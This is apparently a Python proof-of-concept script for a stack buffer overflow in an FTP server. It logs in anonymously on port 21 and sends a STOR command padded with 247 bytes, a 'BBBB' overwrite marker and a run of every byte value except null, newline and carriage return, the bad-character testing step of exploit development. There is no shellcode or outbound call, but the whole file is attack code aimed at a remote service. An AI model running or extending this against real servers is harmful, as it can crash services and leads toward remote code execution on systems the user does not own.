#!/usr/bin/env python3
import socket
import sys

OFFSET = 247
BAD_CHARS = b"\x00\x0a\x0d"

# Buffer to find bad characters
buf = b"A" * OFFSET
buf += b"BBBB"
buf += bytes([b for b in range(256) if b not in BAD_CHARS])

if len(sys.argv) < 2:
    print("Usage: ./poc.py <target-IP>")
    exit()

s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
s.connect((sys.argv[1], 21))
s.recv(1024)
s.send(b'USER anonymous\r\n')
s.recv(1024)
s.send(b'PASS anonymous\r\n')
s.recv(1024)
s.send(b'STOR' + buf + b'\r\n')
s.recv(1024)
s.send(b'QUIT\r\n')
s.close()